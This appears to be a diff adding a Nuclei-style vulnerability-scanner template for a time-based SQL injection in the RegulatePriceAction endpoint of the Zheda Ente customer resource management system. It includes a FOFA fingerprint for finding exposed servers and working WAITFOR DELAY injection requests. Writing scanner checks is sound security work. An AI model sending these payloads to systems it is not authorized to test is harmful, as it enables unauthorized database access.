@@ -1,0 +1,39 @@
+id: zhedaente-RegulatePriceAction-sql
+
+info:
+  name: "浙大恩特客户资源管理系统 RegulatePriceAction 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="script/Ent.base.js"
+      浙大恩特客户资源管理系统在 RegulatePriceAction 接口实现中未正确校验用户输入参数，导致存在SQL注入漏洞。攻击者可通过构造恶意SQL查询语句，实现对后端数据库的未授权访问，包括提取敏感数据（如管理员账号凭证、用户隐私信息）及在特定权限条件下向服务器写入恶意文件，最终可能达成系统权限劫持。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488344&idx=1&sn=09ec1fee8a52c85ed47ea353a19e40ff&chksm=c267a66bf5102f7da9e132ce41a6cfc9a2554f2c71e3d5a94bf16f4ef7511d673f1f1b919b70&token=377357801&lang=zh_CN#rd
+  tags: 浙大恩特客户资源管理系统
+
+
+
+http:
+- raw:
+  - |
+    GET /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  - |
+    GET /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
